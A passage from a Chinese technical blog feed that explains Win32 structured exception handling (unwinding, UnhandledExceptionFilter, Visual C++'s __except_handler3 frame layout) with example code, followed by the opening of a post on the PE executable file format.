<span id="cb7-48"><a href="#cb7-48" aria-hidden="true"></a>    *(PDWORD)<span class="dv">0</span> = <span class="dv">0</span>; <span class="co">// 写入地址0，从而引发一个错误</span></span>
<span id="cb7-49"><a href="#cb7-49" aria-hidden="true"></a>    printf( <span class="st">&quot;I should never get here!</span><span class="sc">\n</span><span class="st">&quot;</span> );</span>
<span id="cb7-50"><a href="#cb7-50" aria-hidden="true"></a> </span>
<span id="cb7-51"><a href="#cb7-51" aria-hidden="true"></a>    __asm</span>
<span id="cb7-52"><a href="#cb7-52" aria-hidden="true"></a>    {</span>
<span id="cb7-53"><a href="#cb7-53" aria-hidden="true"></a>       <span class="co">// 移去我们的EXECEPTION_REGISTRATION结构</span></span>
<span id="cb7-54"><a href="#cb7-54" aria-hidden="true"></a>       mov eax,[ESP]     <span class="co">// 获取前一个结构</span></span>
<span id="cb7-55"><a href="#cb7-55" aria-hidden="true"></a>       mov FS:[<span class="dv">0</span>], EAX <span class="co">// 安装前一个结构</span></span>
<span id="cb7-56"><a href="#cb7-56" aria-hidden="true"></a>       add esp, <span class="dv">8</span>        <span class="co">// 把我们EXECEPTION_REGISTRATION结构弹出堆栈</span></span>
<span id="cb7-57"><a href="#cb7-57" aria-hidden="true"></a>    }</span>
<span id="cb7-58"><a href="#cb7-58" aria-hidden="true"></a>}</span>
<span id="cb7-59"><a href="#cb7-59" aria-hidden="true"></a> </span>
<span id="cb7-60"><a href="#cb7-60" aria-hidden="true"></a> </span>
<span id="cb7-61"><a href="#cb7-61" aria-hidden="true"></a><span class="dt">int</span> main()</span>
<span id="cb7-62"><a href="#cb7-62" aria-hidden="true"></a>{</span>
<span id="cb7-63"><a href="#cb7-63" aria-hidden="true"></a>    __try</span>
<span id="cb7-64"><a href="#cb7-64" aria-hidden="true"></a>    {</span>
<span id="cb7-65"><a href="#cb7-65" aria-hidden="true"></a>        HomeGrownFrame();</span>
<span id="cb7-66"><a href="#cb7-66" aria-hidden="true"></a>    }</span>
<span id="cb7-67"><a href="#cb7-67" aria-hidden="true"></a>    __except( EXCEPTION_EXECUTE_HANDLER )</span>
<span id="cb7-68"><a href="#cb7-68" aria-hidden="true"></a>    {</span>
<span id="cb7-69"><a href="#cb7-69" aria-hidden="true"></a>        printf( <span class="st">&quot;Caught the exception in main()</span><span class="sc">\n</span><span class="st">&quot;</span> );</span>
<span id="cb7-70"><a href="#cb7-70" aria-hidden="true"></a>    }</span>
<span id="cb7-71"><a href="#cb7-71" aria-hidden="true"></a> </span>
<span id="cb7-72"><a href="#cb7-72" aria-hidden="true"></a>    <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb7-73"><a href="#cb7-73" aria-hidden="true"></a>}</span></code></pre></div>
<p>使用<code>Visual Studio 2022 win x86 Debug</code>编译并运行调试：</p>
<p><img src="https://pic.imgdb.cn/item/64f572f8661c6c8e543fdf11.jpg" /></p>
<p>为了使代码尽量简单，我使用了编译器层面的异常处理。main函数只设置了一个 <code>__try/__except</code>块。在<code>__try</code>块内部调用了<code>HomeGrownFrame</code>函数。这个函数与前面的MYSEH程序非常相似。它也是在堆栈上创建一个<code>EXCEPTION_REGISTRATION</code>结构，并且让FS:[0]指向此结构。在建立了新的异常处理程序之后，这个函数通过向一个NULL 指针所指向的内存处写入数据而故意引发一个错误：<code>*(PDWORD)0 = 0;</code></p>
<p>这个异常处理回调函数，同样被称为<code>_except_handler</code>，却与前面的那个截然不同。它首先打印出<code>ExceptionRecord</code>结构中的异常代码和标志，这个结构的地址是作为一个指针参数被这个函数接收的。打印出异常标志的原因一会儿就清楚了。因为<code>_except_handler</code>函数并没有打算修复出错的代码，因此它返回<code>ExceptionContinueSearch</code>。这导致操作系统继续在<code>EXCEPTION_REGISTRATION</code>结构链表中搜索下一个 <code>EXCEPTION_REGISTRATION</code>结构。接下来安装的异常回调函数是针对main函数中的<code>__try/__except</code>块的。<code>__excep</code>t块简单地打印出<code>“Caught the exception in main()”</code>。此时我们只是简单地忽略这个异常来表明我们已经处理了它。</p>
<p>这里的关键是执行流程。<strong>当一个异常处理程序拒绝处理某个异常时，它实际上也就拒绝决定流程最终将从何处恢复。只有处理某个异常的异常处理程序才能决定待所有异常处理代码执行完毕之后流程将从何处恢复。</strong></p>
<p>当使用结构化异常处理时，如果一个函数有一个异常处理程序但它却不处理某个异常，这个函数就有可能非正常退出。例如在MYSEH2中 <code>HomeGrownFrame</code>函数就不处理异常。由于在链表中后面的某个异常处理程序（这里是main函数中的）处理了这个异常，因此出错指令后面的 printf就永远不会执行。</p>
<h2 id="x05-展开unwinding">0x05 展开（Unwinding）</h2>
<p>注意到上面的MYSEH2.CPP的运行结果，打印了两次Home Grown handler.</p>
<pre><code>Home Grown handler: Exception Code: C0000005 Exception Flags 0
Home Grown handler: Exception Code: C0000027 Exception Flags 2 EH_UNWINDING
Caught the Exception in main()</code></pre>
<p>比较一下以“Home Grown Handler”开头的两行，就会看出它们之间有明显的区别。第一次异常标志是0，而第二次是2。实际上，当一个异常处理回调函数拒绝处理某个异常时，它会被再一次调用。但是这次回调并不是立即发生的。这有点复杂。我需要把异常发生时的情形好好梳理一下</p>
<p><strong>当异常发生时，系统遍历<code>EXCEPTION_REGISTRATION</code>结构链表，直到它找到一个处理这个异常的处理程序。一旦找到，系统就再次遍历这个链表，直到处理这个异常的结点为止。在这第二次遍历中，系统将再次调用每个异常处理函数。关键的区别是，在第二次调用中，异常标志被设置为2。这个值被定义为<code>EH_UNWINDING</code>。</strong>（<code>EH_UNWINDING</code>的定义在Visual C++ 运行时库源代码文件<code>EXCEPT.INC</code>中，但Win32 SDK中并没有与之等价的定义。）</p>
<p><strong>EH_UNWINDING:</strong> 当一个异常处理回调函数被第二次调用时（带<code>EH_UNWINDING</code>标志），操作系统给这个函数一个最后清理的机会。</p>
<p>一个绝好的例子是C++类的析构函数。当一个函数的异常处理程序拒绝处理某个异常时，通常执行流程并不会正常地从那个函数退出。现在，想像一个定义了 一个C++类的实例作为局部变量的函数。C++规范规定析构函数必须被调用。这带<code>EH_UNWINDING</code>标志的第二次回调就给这个函数一个机会去做一些类似于调用析构函数和<code>__finally</code>块之类的清理工作。</p>
<p>在异常已经被处理完毕，并且所有前面的异常帧都已经被展开之后，流程从处理异常的那个回调函数决定的地方开始继续执行。一定要记住，仅仅把指令指针设置到所需的代码处就开始执行是不行的。流程恢复执行处的代码的堆栈指针和栈帧指针（在Intel CPU上是ESP和EBP）也必须被恢复成它们在处理这个异常的函数的栈帧上的值。因此，这个处理异常的回调函数必须负责把堆栈指针和栈帧指针恢复成它们在包含处理这个异常的SEH代码的函数的堆栈上的值。</p>
<p>通常，展开操作导致堆栈上处理异常的帧以下的堆栈区域上的所有内容都被移除了，就好像我们从来没有调用过这些函数一样。展开的另外一个效果就是<code>EXCEPTION_REGISTRATION</code>结构链表上处理异常的那个结构之前的所有<code>EXCEPTION_REGISTRATION</code>结构都被移除了。这很好理解，因为这些<code>EXCEPTION_REGISTRATION</code>结构通常都被创建在堆栈上。在异常被处理后，堆栈指针和栈帧指针在内存中比那些从 <code>EXCEPTION_REGISTRATION</code>结构链表上移除的<code>EXCEPTION_REGISTRATION</code>结构高。</p>
<p><img src="https://pic.imgdb.cn/item/64f57689661c6c8e544110f4.jpg" /></p>
<h2 id="x06-unhandledexceptionfilter">0x06 UnhandledExceptionFilter</h2>
<p>迄今为止，实际上我们一直在假设操作系统总是能在<code>EXCEPTION_REGISTRATION</code>结构链表中找到一个异常处理程序。实际上，操作系统暗中已经为每个线程都提供了一个默认的异常处理程序。这个默认的异常处理程序总是链表的最后一个结点，并且它总是选择处理异常。</p>
<p>很明显它需要在线程执行的早期，在任何用户代码开始执行之前,操作系统是在这个时候插入了这个默认的、最后一个异常处理程序。</p>
<p>如果线程引发了一个异常但是没有异常处理程序来处理它时，程序会调用<code>UnhandledExceptionFilter</code>这个API,重要的是<code>UnhandledExceptionFilter</code>这个API包含了默认的异常处理程序。</p>
<p>如果<code>UnhandledExceptionFilter</code>返回<code>EXCEPTION_EXECUTE_HANDLER</code>，而<code>__except</code>块所做的只是调用<code>ExitProcess</code>函数去终止当前进程。显而易见， 如果一个进程引发了一个错误而没有异常处理程序去处理它，这个进程就会被系统终止。</p>
<p>如果引发错误的线程是作为服务来运行的，并且是基于线程的服务，那么<code>__excep</code>t块并不调用<code>ExitProcess</code>，相反，它调用<code>ExitThread</code>。不能仅仅因为一个服务出错就终止整个服务进程。</p>
<p>所以<code>UnhandledExceptionFilter</code>中的默认异常处理程序都做了什么:</p>
<p><img src="https://pic.imgdb.cn/item/64f57bfd661c6c8e54424f14.jpg" /></p>
<p>显然可以注意到，<code>UnhandledExceptionFilter</code>显示了一个对话框告诉你发生了一个错误。这时，你被给予了一个机会或者终止出错进程，或者调试它。</p>
<h2 id="x07-编译器层面seh">0x07 编译器层面SEH</h2>
<p>编译器对<code>try/except</code>进行封装实在是非常有必要的.</p>
<h3 id="基于帧的异常处理">7.1 基于帧的异常处理</h3>
<p>常见的基于帧的异常处理程序模型：</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a>__try {</span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a>    <span class="co">// 这里是被保护的代码</span></span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a>}</span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a>__except (过滤器表达式) { </span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true"></a>   <span class="co">// 这里是异常处理程序代码</span></span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true"></a>}</span></code></pre></div>
<p>简单地说，在一个函数中，一个<code>__try</code>块中的所有代码就通过创建在这个函数的堆栈帧上的一个<code>EXCEPTION_REGISTRATION</code>结构来保护。</p>
<p>在函数的入口处，这个新的<code>EXCEPTION_REGISTRATION</code>结构被放在异常处理程序链表的头部。在<code>__try</code>块结束后，相应的 <code>EXCEPTION_REGISTRATION</code>结构从这个链表的头部被移除。</p>
<p>异常处理程序链表的头部被保存在FS:[0]处。因此，调试器中单步跟踪时看到类似下面的指令:</p>
<pre class="assembly"><code>MOV DWORD PTR FS:[00000000],ESP</code></pre>
<p>或者</p>
<pre class="assembly"><code>MOV DWORD PTR FS:[00000000],ECX</code></pre>
<p>就能非常确定这段代码正在进入或退出一个<code>__try/__except</code>块</p>
<p>既然一个<code>__try</code>块相当于堆栈上的一个<code>EXCEPTION_REGISTRATION</code>结构，<code>EXCEPTION_REGISTRATION</code>结构中异常处理回调函数相当于<strong>过滤器表达式（filter-expression）</strong>代码。实际上，过滤器表达式就是<code>__except</code>关键字后面的小括号中的代码。就是这个过滤器表达式代码决定了后面的大括号中的代码是否执行。</p>
<p>事实上，各个<code>EXCEPTION_REGISTRATION</code>结构的handler域都指向了同一个函数。这个函数在Visual C++的运行时库中，它被称为<code>__except_handler3</code>。正是这个<code>__except_handler3</code>调用了过滤器表达式代码。</p>
<p>以及，并不是每次进入或退出一个<code>__try</code>块时就创建或撤销一个<code>EXCEPTION_REGISTRATION</code>结构。 相反，在使用SEH的任何函数中只创建一个<code>EXCEPTION_REGISTRATION</code>结构。换句话说，你可以在一个函数中使用多个<code>__try/__except</code>块，但是在堆栈上只创建一个<code>EXCEPTION_REGISTRATION</code>结构。同样，你可以在一个函数中嵌套使用<code>__try</code>块，但Visual C++仍旧只是创建一个<code>EXCEPTION_REGISTRATION</code>结构。</p>
<p>如果整个EXE或DLL只需要单个的异常处理程序（<code>__except_handler3</code>），同时，如果单个的<code>EXCEPTION_REGISTRATION</code> 结构就能处理多个<code>__try</code>块的话，很明显，这里还有更多需要学习的地方。</p>
<h3 id="扩展的异常处理帧">7.2 扩展的异常处理帧</h3>
<p>Visual C++的 SEH实现并没有使用原始的EXCEPTION_REGISTRATION结构。它在这个结构的末尾添加了一些附加数据。这些附加数据正是允许单个函数 （__except_handler3）处理所有异常并将执行流程传递到相应的过滤器表达式和__except块的关键。我在Visual C++运行时库源代码中的EXSUP.INC文件中找到了有关Visual C++扩展的EXCEPTION_REGISTRATION结构格式的线索。在这个文件中，你会看到以下定义（已经被注释掉了）：</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a>;<span class="kw">struct</span> _EXCEPTION_REGISTRATION{</span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true"></a>;   <span class="kw">struct</span> _EXCEPTION_REGISTRATION *prev;</span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true"></a>;   <span class="dt">void</span> (*handler)(    PEXCEPTION_RECORD,</span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true"></a>;                   PEXCEPTION_REGISTRATION,</span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true"></a>;                   PCONTEXT,</span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true"></a>;                  PEXCEPTION_RECORD);</span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true"></a>;   <span class="kw">struct</span> scopetable_entry *scopetable;</span>
<span id="cb12-8"><a href="#cb12-8" aria-hidden="true"></a>;   <span class="dt">int</span> trylevel;</span>
<span id="cb12-9"><a href="#cb12-9" aria-hidden="true"></a>;   <span class="dt">int</span> _ebp;</span>
<span id="cb12-10"><a href="#cb12-10" aria-hidden="true"></a>;   PEXCEPTION_POINTERS xpointers;</span>
<span id="cb12-11"><a href="#cb12-11" aria-hidden="true"></a>;};</span></code></pre></div>
<p>在前面你已经见过前两个域：<code>prev</code>和<code>handler</code>。它们组成了基本的<code>EXCEPTION_REGISTRATION</code>结构。后面三个域：<code>scopetable</code>（作用域表）、<code>trylevel</code>和<code>_ebp</code>是新增加的。<code>scopetable</code>域指向一个<code>scopetable_entry</code>结构数组，而<code>trylevel</code>域实际上是这个数组的索引。最后一个域<code>_ebp</code>，是<code>EXCEPTION_REGISTRATION</code>结构创建之前栈帧指针（EBP）的值。</p>
<p><code>_ebp</code>域成为扩展的<code>EXCEPTION_REGISTRATION</code>结构的一部分并非偶然。它是通过<code>PUSH EBP</code>这条指令被包含进这个结构中的，而大多数函数开头都是这条指令（<strong>通常编译器并不为使用FPO优化的函数生成标准的堆栈帧，这样其第一条指令可能不是<code>PUSH EBP</code>。但是如果使用了SEH的话，那么无论你是否使用了FPO优化，编译器一定生成标准的堆栈帧</strong>）。这条指令可以使<code>EXCEPTION_REGISTRATION</code>结构中所有其它的域都可以用一个相对于栈帧指针（EBP）的负偏移来访问。例如<code>trylevel</code>域在[EBP-04]处，<code>scopetable</code>指针在[EBP-08]处，等等。（也就是说，这个结构是从[EBP-10H]处开始 的）</p>
<p>紧跟着扩展的<code>EXCEPTION_REGISTRATION</code>结构下面，Visual C++压入了另外两个值。紧跟着（即[EBP-14H]处）的一个DWORD，是为一个指向<strong>EXCEPTION_POINTERS</strong>结构（一个标准的Win32 结构）的指针所保留的空间。这个指针就是你调用<strong>GetExceptionInformation</strong>这个API时返回的指针。尽管SDK文档暗示<code>GetExceptionInformation</code>是一个标准的Win32 API，但事实上它是一个编译器内联函数。当调用这个函数时,Visual C++生成以下代码：</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a>MOV EAX,DWORD PTR [EBP-<span class="dv">14</span>]</span></code></pre></div>
<p><code>GetExceptionInformation</code>是一个编译器内联函数，与它相关的<code>GetExceptionCode</code>函数也是如此。此函数实际上只是返回<code>GetExceptionInformation</code>返回的数据结构（<code>EXCEPTION_POINTERS</code>）中的一个结构 （<code>EXCEPTION_RECORD</code>）中的一个域（<code>ExceptionCode</code>）的值。</p>
<p>标准异常堆栈帧：</p>
<pre><code>EBP-00 _ebp
EBP-04 trylevel
EBP-08 scopetable数组指针
EBP-0C handler函数地址
EBP-10 指向前一个EXCEPTION_REGISTRATION结构
EBP-14 GetExceptionInformation
EBP-18 栈帧中的标准ESP</code></pre>
<p>在操作系统看来，只存在组成原始<code>EXCEPTION_REGISTRATION</code>结构的两个域：即[EBP-10h]处的<code>prev</code>指针和[EBP-0Ch]处的<code>handler</code>函数指针。栈帧中的其它所有内容是针对于Visual C++的.</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a><span class="dt">int</span> __except_handler3(</span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true"></a><span class="kw">struct</span> _EXCEPTION_RECORD * pExceptionRecord,</span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true"></a><span class="kw">struct</span> EXCEPTION_REGISTRATION * pRegistrationFrame,</span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true"></a><span class="kw">struct</span> _CONTEXT *pContextRecord,</span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true"></a><span class="dt">void</span> * pDispatcherContext )</span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true"></a>{</span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true"></a>    LONG filterFuncRet;</span>
<span id="cb15-8"><a href="#cb15-8" aria-hidden="true"></a>    LONG trylevel;</span>
<span id="cb15-9"><a href="#cb15-9" aria-hidden="true"></a>    EXCEPTION_POINTERS exceptPtrs;</span>
<span id="cb15-10"><a href="#cb15-10" aria-hidden="true"></a>    PSCOPETABLE pScopeTable;</span>
<span id="cb15-11"><a href="#cb15-11" aria-hidden="true"></a>    CLD <span class="co">// 将方向标志复位（不测试任何条件！）</span></span>
<span id="cb15-12"><a href="#cb15-12" aria-hidden="true"></a>    <span class="co">// 如果没有设置EXCEPTION_UNWINDING标志或EXCEPTION_EXIT_UNWIND标志</span></span>
<span id="cb15-13"><a href="#cb15-13" aria-hidden="true"></a>    <span class="co">// 表明这是第一次调用这个处理程序（也就是说，并非处于异常展开阶段）</span></span>
<span id="cb15-14"><a href="#cb15-14" aria-hidden="true"></a>    <span class="cf">if</span> ( ! (pExceptionRecord-&gt;ExceptionFlags</span>
<span id="cb15-15"><a href="#cb15-15" aria-hidden="true"></a>        &amp; (EXCEPTION_UNWINDING | EXCEPTION_EXIT_UNWIND)) )</span>
<span id="cb15-16"><a href="#cb15-16" aria-hidden="true"></a>    {</span>
<span id="cb15-17"><a href="#cb15-17" aria-hidden="true"></a>        <span class="co">// 在堆栈上创建一个EXCEPTION_POINTERS结构</span></span>
<span id="cb15-18"><a href="#cb15-18" aria-hidden="true"></a>        exceptPtrs.ExceptionRecord = pExceptionRecord;</span>
<span id="cb15-19"><a href="#cb15-19" aria-hidden="true"></a>        exceptPtrs.ContextRecord = pContextRecord;</span>
<span id="cb15-20"><a href="#cb15-20" aria-hidden="true"></a>        <span class="co">// 把前面定义的EXCEPTION_POINTERS结构的地址放在比</span></span>
<span id="cb15-21"><a href="#cb15-21" aria-hidden="true"></a>        <span class="co">// establisher栈帧低4个字节的位置上。参考前面我讲</span></span>
<span id="cb15-22"><a href="#cb15-22" aria-hidden="true"></a>        <span class="co">// 的编译器为GetExceptionInformation生成的汇编代码*(PDWORD)                        ((PBYTE)pRegistrationFrame - 4) = &amp;exceptPtrs;</span></span>
<span id="cb15-23"><a href="#cb15-23" aria-hidden="true"></a>        <span class="co">// 获取初始的“trylevel”值</span></span>
<span id="cb15-24"><a href="#cb15-24" aria-hidden="true"></a>        trylevel = pRegistrationFrame-&gt;trylevel;</span>
<span id="cb15-25"><a href="#cb15-25" aria-hidden="true"></a>        <span class="co">// 获取指向scopetable数组的指针 </span></span>
<span id="cb15-26"><a href="#cb15-26" aria-hidden="true"></a>        scopeTable = pRegistrationFrame-&gt;scopetable;</span>
<span id="cb15-27"><a href="#cb15-27" aria-hidden="true"></a>        search_for_handler:</span>
<span id="cb15-28"><a href="#cb15-28" aria-hidden="true"></a>        <span class="cf">if</span> ( pRegistrationFrame-&gt;trylevel != TRYLEVEL_NONE )</span>
<span id="cb15-29"><a href="#cb15-29" aria-hidden="true"></a>        {</span>
<span id="cb15-30"><a href="#cb15-30" aria-hidden="true"></a>            <span class="cf">if</span> ( pRegistrationFrame-&gt;scopetable[trylevel].lpfnFilter )</span>
<span id="cb15-31"><a href="#cb15-31" aria-hidden="true"></a>            {</span>
<span id="cb15-32"><a href="#cb15-32" aria-hidden="true"></a>                PUSH EBP <span class="co">// 保存这个栈帧指针</span></span>
<span id="cb15-33"><a href="#cb15-33" aria-hidden="true"></a>                <span class="co">// ！！！非常重要！！！切换回原来的EBP。正是这个操作才使得</span></span>
<span id="cb15-34"><a href="#cb15-34" aria-hidden="true"></a>                <span class="co">// 栈帧上的所有局部变量能够在异常发生后仍然保持它的值不变。</span></span>
<span id="cb15-35"><a href="#cb15-35" aria-hidden="true"></a>                EBP = &amp;pRegistrationFrame-&gt;_ebp;</span>
<span id="cb15-36"><a href="#cb15-36" aria-hidden="true"></a>                <span class="co">// 调用过滤器函数</span></span>
<span id="cb15-37"><a href="#cb15-37" aria-hidden="true"></a>                filterFuncRet = scopetable[trylevel].lpfnFilter();</span>
<span id="cb15-38"><a href="#cb15-38" aria-hidden="true"></a>                POP EBP <span class="co">// 恢复异常处理程序的栈帧指针</span></span>
<span id="cb15-39"><a href="#cb15-39" aria-hidden="true"></a>                <span class="cf">if</span> ( filterFuncRet != EXCEPTION_CONTINUE_SEARCH )</span>
<span id="cb15-40"><a href="#cb15-40" aria-hidden="true"></a>                {</span>
<span id="cb15-41"><a href="#cb15-41" aria-hidden="true"></a>                    <span class="cf">if</span> ( filterFuncRet &lt; <span class="dv">0</span> ) <span class="co">// EXCEPTION_CONTINUE_EXECUTION</span></span>
<span id="cb15-42"><a href="#cb15-42" aria-hidden="true"></a>                       <span class="cf">return</span> ExceptionContinueExecution;</span>
<span id="cb15-43"><a href="#cb15-43" aria-hidden="true"></a> </span>
<span id="cb15-44"><a href="#cb15-44" aria-hidden="true"></a>                    <span class="co">// 如果能够执行到这里，说明返回值为EXCEPTION_EXECUTE_HANDLER</span></span>
<span id="cb15-45"><a href="#cb15-45" aria-hidden="true"></a>                    scopetable = pRegistrationFrame-&gt;scopetable;</span>
<span id="cb15-46"><a href="#cb15-46" aria-hidden="true"></a>                    <span class="co">// 让操作系统清理已经注册的栈帧，这会使本函数被递归调用</span></span>
<span id="cb15-47"><a href="#cb15-47" aria-hidden="true"></a>                    __global_unwind2( pRegistrationFrame );</span>
<span id="cb15-48"><a href="#cb15-48" aria-hidden="true"></a>                    <span class="co">// 一旦执行到这里，除最后一个栈帧外，所有的栈帧已经</span></span>
<span id="cb15-49"><a href="#cb15-49" aria-hidden="true"></a>                    <span class="co">// 被清理完毕，流程要从最后一个栈帧继续执行</span></span>
<span id="cb15-50"><a href="#cb15-50" aria-hidden="true"></a>                    EBP = &amp;pRegistrationFrame-&gt;_ebp;</span>
<span id="cb15-51"><a href="#cb15-51" aria-hidden="true"></a>                    __local_unwind2( pRegistrationFrame, trylevel );</span>
<span id="cb15-52"><a href="#cb15-52" aria-hidden="true"></a>                    <span class="co">// NLG = &quot;non-local-goto&quot; (setjmp/longjmp stuff)</span></span>
<span id="cb15-53"><a href="#cb15-53" aria-hidden="true"></a>                    __NLG_Notify( <span class="dv">1</span> ); <span class="co">// EAX = scopetable-&gt;lpfnHandler</span></span>
<span id="cb15-54"><a href="#cb15-54" aria-hidden="true"></a>                    <span class="co">// 把当前的trylevel设置成当找到一个异常处理程序时</span></span>
<span id="cb15-55"><a href="#cb15-55" aria-hidden="true"></a>                    <span class="co">// SCOPETABLE中当前正在被使用的那一个元素的内容</span></span>
<span id="cb15-56"><a href="#cb15-56" aria-hidden="true"></a>                    pRegistrationFrame-&gt;trylevel = scopetable-&gt;previousTryLevel;</span>
<span id="cb15-57"><a href="#cb15-57" aria-hidden="true"></a>                    <span class="co">// 调用__except {}块，这个调用并不会返回</span></span>
<span id="cb15-58"><a href="#cb15-58" aria-hidden="true"></a>                    pRegistrationFrame-&gt;scopetable[trylevel].lpfnHandler();</span>
<span id="cb15-59"><a href="#cb15-59" aria-hidden="true"></a>                }</span>
<span id="cb15-60"><a href="#cb15-60" aria-hidden="true"></a>            }</span>
<span id="cb15-61"><a href="#cb15-61" aria-hidden="true"></a> </span>
<span id="cb15-62"><a href="#cb15-62" aria-hidden="true"></a>            scopeTable = pRegistrationFrame-&gt;scopetable;</span>
<span id="cb15-63"><a href="#cb15-63" aria-hidden="true"></a>            trylevel = scopeTable-&gt;previousTryLevel;</span>
<span id="cb15-64"><a href="#cb15-64" aria-hidden="true"></a>            <span class="cf">goto</span> search_for_handler;</span>
<span id="cb15-65"><a href="#cb15-65" aria-hidden="true"></a>        }</span>
<span id="cb15-66"><a href="#cb15-66" aria-hidden="true"></a>        <span class="cf">else</span> <span class="co">// trylevel == TRYLEVEL_NONE</span></span>
<span id="cb15-67"><a href="#cb15-67" aria-hidden="true"></a>        {</span>
<span id="cb15-68"><a href="#cb15-68" aria-hidden="true"></a>            <span class="cf">return</span> ExceptionContinueSearch;</span>
<span id="cb15-69"><a href="#cb15-69" aria-hidden="true"></a>        }</span>
<span id="cb15-70"><a href="#cb15-70" aria-hidden="true"></a>    }</span>
<span id="cb15-71"><a href="#cb15-71" aria-hidden="true"></a>    <span class="cf">else</span> <span class="co">// 设置了EXCEPTION_UNWINDING标志或EXCEPTION_EXIT_UNWIND标志</span></span>
<span id="cb15-72"><a href="#cb15-72" aria-hidden="true"></a>    {</span>
<span id="cb15-73"><a href="#cb15-73" aria-hidden="true"></a>       PUSH EBP <span class="co">// 保存EBP</span></span>
<span id="cb15-74"><a href="#cb15-74" aria-hidden="true"></a>       EBP = &amp;pRegistrationFrame-&gt;_ebp; <span class="co">// 为调用__local_unwind2设置EBP</span></span>
<span id="cb15-75"><a href="#cb15-75" aria-hidden="true"></a>       __local_unwind2( pRegistrationFrame, TRYLEVEL_NONE )</span>
<span id="cb15-76"><a href="#cb15-76" aria-hidden="true"></a>       POP EBP <span class="co">// 恢复EBP</span></span>
<span id="cb15-77"><a href="#cb15-77" aria-hidden="true"></a>       <span class="cf">return</span> ExceptionContinueSearch;</span>
<span id="cb15-78"><a href="#cb15-78" aria-hidden="true"></a>    }</span>
<span id="cb15-79"><a href="#cb15-79" aria-hidden="true"></a>}</span></code></pre></div>
<h2 id="x08-总结">0x08 总结</h2>
<p>结构化异常处理是Win32一个非常好的特性。多亏有了像Visual C++之类的编译器的支持层对它的封装，一般的程序员才能付出比较小的学习代价就能利用SEH所提供的便利。但是在操作系统层面上，事情远比Win32文档说的复杂。</p>
<p>不幸的是，由于人人都认为系统层面的SEH是一个非常困难的问题，因此至今这方面的资料都不多。总的来说，系统层面的SEH就是围绕着简单的回调在打转。</p>]]></description>
    <pubDate>Mon, 4 Sep 2023 15:29:23 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[Re1 - PE结构]]></title>
    <link>https://blog.mark0519.com/#/others/230903-re1-pe</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#/others/230903-re1-pe</guid>
    <description><![CDATA[<h1 id="re1---pe结构">Re1 - PE结构</h1>
<h2 id="x00-pe介绍">0x00 PE介绍</h2>
<ul>
<li>可移植的<a href="https://so.csdn.net/so/search?q=可执行文件&amp;spm=1001.2101.3001.7020">可执行文件</a>（PE，Portable Executable File），Win NT平台可执行文件使用的一种格式。</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/64f4a142661c6c8e541c91b1.jpg" /></p>
<p>在PE文件中，代码，已初始化的数据，资源，重定位信息等数据按照数据属性分类放到不同的<code>Section(节区)</code>里，每个节区的属性和位置用一个<code>IMAGE_SECTION_HEADER</code>结构来描述，所有的<code>IMAGE_SECTION_HEADER</code>结构组成了一个<code>Section Table(节表)</code>，节表数据在PE文件中被房子啊所有节数据的前面。</p>
<h2 id="x01-pe分析">0x01 PE分析</h2>
<h3 id="dos头">1. DOS头</h3>
<p>所有的PE文件都是以一个64字节的DOS头（MZ文件头）开始。这个DOS头只是为了兼容早期的DOS操作系统。</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> _IMAGE_DOS_HEADER {　<span class="co">// DOS .EXE header</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a>    WORD　e_magic;　　　　　　<span class="co">// Magic number/DOS头部</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a>    ...</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a>    LONG　e_lfanew;　　　　　<span class="co">// 指向PE文件的开头</span></span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a>} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span></code></pre></div>
<ul>
<li><p><code>e_magic</code> 字段: DOS 可执行文件的标识符，占用 2 字节。该位置保存着的字符是“MZ”。</p></li>
<li><p><code>e_lfanew</code> 字段： 保存着PE头的起始位置。</p></li>
</ul>
<p><img src="https://pic.imgdb.cn/item/64f4a3e1661c6c8e541d4421.jpg" /></p>
<h3 id="pe头">2. PE头</h3>
<p>该文件头由<code>IMAGE_NT_HEADERS</code>结构定义，利用宏定义来区分32/64位，这里学习32位</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> _IMAGE_NT_HEADERS {</span>
